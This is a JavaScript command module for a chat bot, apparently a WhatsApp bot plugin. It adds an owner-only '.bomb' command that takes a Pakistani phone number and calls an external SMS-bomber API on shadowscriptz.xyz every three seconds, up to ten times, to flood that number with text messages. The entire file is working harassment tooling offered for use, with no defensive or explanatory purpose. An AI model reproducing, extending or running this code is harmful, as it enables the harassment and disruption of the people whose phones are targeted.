const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // Extract Number (Remove ALL non-digits + trim spaces/newlines)
    let number = text.replace(/[^\d]/g, '').trim(); // Pure number nikalne ka hardcore tareeka
    number = number.match(/92\d{9}$/)?.[0]; // Match ONLY 92 followed by 9 digits

    // Validate Number
    if (!number) {
        return reply("❌ Invalid PK number! Use: .bomb 923001234567");
    }

    // Start Bombing
    isBombing = true;
    let sent = 0;
    reply(`💣 *Bombing Started!*\nNumber: ${number}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= 10) { // Max 10 SMS
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sent} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            console.log("API Response:", response.status, await response.text());
            
            if (!response.ok) throw new Error(`API Error: ${response.status}`);
            sent++;
            
        } catch (err) {
            console.error("Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 3000); // 3-second delay
});
